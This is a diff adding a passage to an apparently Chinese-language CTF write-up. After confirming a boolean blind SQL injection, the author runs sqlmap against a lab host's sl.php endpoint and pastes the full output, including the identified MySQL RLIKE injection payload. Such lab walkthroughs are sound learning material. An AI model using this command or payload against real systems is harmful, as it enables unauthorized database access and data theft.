@@ -348,5 +348,58 @@ forest_temple
 布尔盲注打通了，现在要来想想怎么继续
 这边决定不手打了，直接上sqlmap
 ```bash
+┌──(kali㉿kali)-[~/tmp/what]
+└─$ sqlmap -u "http://10.216.75.72/sl.php" \
+--method=POST \
+--data="query_id=1*" \
+--referer="http://10.216.75.72/secret.php" \
+--technique=B \
+--level=3 --risk=2 \
+--batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 03:48:58 /2026-05-06/
+
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[03:48:59] [INFO] testing connection to the target URL
+[03:48:59] [INFO] testing if the target URL content is stable
+[03:48:59] [INFO] target URL content is stable
+[03:48:59] [INFO] testing if (custom) POST parameter '#1*' is dynamic
+[03:48:59] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
+[03:48:59] [INFO] heuristic (basic) test shows that (custom) POST parameter '#1*' might be injectable
+[03:48:59] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
+[03:48:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:48:59] [WARNING] reflective value(s) found and filtering out
+[03:48:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[03:49:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[03:49:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[03:49:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[03:49:00] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[03:49:00] [INFO] (custom) POST parameter '#1*' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (2) values? [Y/n] Y
+[03:49:00] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
+(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 163 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: query_id=1' RLIKE (SELECT (CASE WHEN (4486=4486) THEN 1 ELSE 0x28 END))-- ccIA
+---
+[03:49:00] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62
+back-end DBMS: MySQL (MariaDB fork)
+[03:49:00] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.216.75.72'
+[03:49:00] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 03:49:00 /2026-05-06/
 ```
